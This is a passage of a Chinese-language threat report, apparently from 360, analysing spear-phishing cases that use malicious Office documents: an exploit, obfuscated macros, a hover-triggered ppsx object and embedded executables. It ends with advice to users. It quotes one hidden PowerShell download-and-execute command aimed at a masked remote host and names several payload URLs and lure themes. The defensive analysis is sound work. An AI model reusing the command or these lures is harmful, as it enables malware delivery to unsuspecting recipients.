需要注意的是，在分析该漏洞其他样本时，还发现不同的利用方式，它不是通过mshta.exe、powershell.exe、cmd.exe等程序从网络加载恶意程序，而是通过内嵌两个对象，其中一个对象为恶意PE文件，漏洞触发后直接运行恶意程序，这种方式在用户断网的情况下仍然可以达成有效攻击。因此可以看出，该漏洞能让攻击者在无需用户交互的前提下在受害者计算机中执行代码，在攻击效果上堪比CVE-2012-0158漏洞，因此后期该漏洞很可能成为各大攻击组织的必备漏洞利用库之一。上述代码主要是从远端（http://xx.xx.99.77/out.ps1）下载恶意文件，并执行。
在此，建议广大用户及时更新系统漏洞补丁，减少漏洞文档触发的可能性。
### 带毒宏攻击案例
如下是一起利用恶意宏文档进行鱼叉邮件攻击的案例，其中邮件主题为Job
Application（工作申请），邮件内容大致是攻击者伪装成自己经验与该工作比较契合，麻烦查看简历，邮件附件名为“Adrena简历”。很多用户在看到该邮件内容、主题以及附件名称，会以为是正常的工作申请，从而打开简历中招。
通过分析Adrena-Resume.doc文档，发现文档中嵌入了恶意宏代码，并且打开文档就会提醒用户该文档是Office早期版本创建，请点击允许执行内容按钮查看内容，如下图所示。如果用户选择点击执行按钮实际上是运行恶意宏代码。
查看宏代码，发现宏代码是经过混淆的，去混淆后，这段宏代码主要功能是从远端（http://185.***.***.***/111.jpg）下载恶意程序，保存在临时目录并执行。
此外，需要特别注意的是，Office软件的宏功能在macOS上也能良好运作，虽然macOS系统上宏功能是默认关闭的，但仍然会有运行安全提示，有些警惕性不强的用户打开文档后，往往可能忽略掉安全提示，直接运行宏代码而中招。因此针对这两种系统，攻击者可以使用同一份攻击代码进行跨平台攻击，例如，在2017年8月份，由360核心安全团队捕获到的跨平台攻击样本“双子星”，该样本兼容了Windows和macOS两操作系统，用户无论是在哪个系统打开这个文档，都有可能中招。此样本是使用宏内建的预定义语法对Mac和Windows平台进行兼容，如果是Mac平台，则采取一句话shell脚本执行Python恶意代码的荷载攻击方式。
在此，提醒广大用户，不要将Office软件宏设置成自动运行选项，并且对于未知的宏代码不要轻易运行。
### 带交互的恶意对象攻击案例
如下是一起利用带交互的恶意对象文档进行鱼叉邮件攻击的案例，其中邮件主题为“Purchase
orders”（采购订单），邮件内容大致是请参阅附件购买设备，邮件附件名为“order&prsn.ppsx”。部分用户在看到该邮件内容、主题以及附件名称，会以为是真实的订单内容，从而打开ppsx文档。
通过分析order&prsn.ppsx文档，发现文档中既没有利用漏洞也未嵌入宏，而是利用带交互的恶意对象进行攻击（Object
Linking攻击）。此文档以恶意PPT文件为载体，通过鼠标悬停事件执行PowerShell代码。
当PowerPoint演示文稿打开时，它将显示文本“正在加载…请等待”作为超链接，显示为用户的蓝色超链接，当用户将鼠标悬停在此文本上，会导致PowerPoint执行PowerShell。但是如果开启了受保护视图安全功能，Office会通知用户风险，用户如果启用内容，PowerShell才会代码被执行。
Powershell代码如下：
    powershell -NoP -NonI -W Hidden -Exec Bypass “IEX （New-Object System.Net.WebClient).DownloadFile（'http:'+[char] 0x2F+[char] 0x2F+'****.nl'+[char] 0x2F+'c.php',\“$env:temp\ii.jse\”); Invoke-Item \“$env:temp\ii.jse\”“
需要注意的是，另外一种带交互的恶意对象攻击（DDE攻击）通常是通过powershell.exe、cmd.exe、mshta.exe等程序从网络加载恶意程序，此类攻击Office应用程序会发出关于包含指向其他文件的链接的文档警告，因此这种攻击跟
Object
Linking攻击一样，不要在Office发出警告提示时，轻易选择开启或确认放行。上述代码主要是连接远端地址hxxp://****.nl/c.php下载恶意文件并执行。
### 嵌入带毒程序攻击案例
如下是一起在文档中嵌入带毒程序进行鱼叉邮件攻击的案例，其中邮件主题是P.O（Purchase
Order采购订单）类，邮件内容大致是请给出附件订单中产品的最优价格，邮件附件名为“P.O#
62826-D.docx”，很多用户在收到此类邮件时，发现发件人使用的是专用的企业邮箱，并且看到该邮件内容、主题以及附件名称，会以为是正常的客户请求，从而打开附件。
通过分析P.O# 62826-D.docx文档，发现文档中既没有利用漏洞也未嵌入宏，而是直接在文档中嵌入PE
恶意文件。打开文档后显示如下所示内容，提示用户双击打开（Please Double Click To Open)，并且该程序伪装成正常的Adobe
PDF文件图标，普通用户会以为是正常的文档内容，从而双击打开该程序。
当用户打开时，就会执行恶意程序output4398CD0.exe。但是默认情况下Office会开启安全保护功能，在此种情况下会通知用户风险，用户如果执行运行，恶意PE程序才会被执行。因此，攻击者在利用此类方式进行攻击时，通常会结合社会工程学来欺骗用户点击打开。
另外，需要特别注意的是，部分攻击者为了达到让用点击“运行”按钮的效果，会嵌入多个同样的PE恶意文件，这造成在用户环境执行该文档时，对弹出的安全警告窗口点击“取消”后会继续弹出，一般安全意识较弱的用户在经过多次操作后没有达到预期效果，则会点击“运行”由此来达到关闭安全警告窗口，从而导致中招。
因此，提醒广大用户，Office办公软件发出警告提示时，应特别谨慎，不要轻易选择执行。
## 结语
综上所述，越来越多的攻击者更加倾向于使用鱼叉攻击邮件来进行网络攻击，原因主要有以下几点：1、电子邮件用户基数庞大，使用广泛。2、攻击成本低，既可以发起点对点攻击，又可以发起点对面攻击；3、结合社会工程学手段，精心构造邮件主题、内容，容易使人中招；4、很多用户的安全意识停留在可执行程序上，使用恶意文档进行攻击很容易让用户放松警惕。
在此，360互联网安全中心提醒广大用户克制好奇心，谨慎对待陌生邮件，不要随意打开来路不明的附件。同时给广大用户以下几点建议：
随时保持杀毒软件防护功能开启，并且及时更新漏洞补丁；
谨慎对待带有“宏”相关提示的文档，不要将Office宏设置为“允许所有宏执行”；
打开文档时，Office发出的安全警告提示应当特别注意，不要轻易选择允许执行；
可以禁止Office相关“自动更新链接”功能。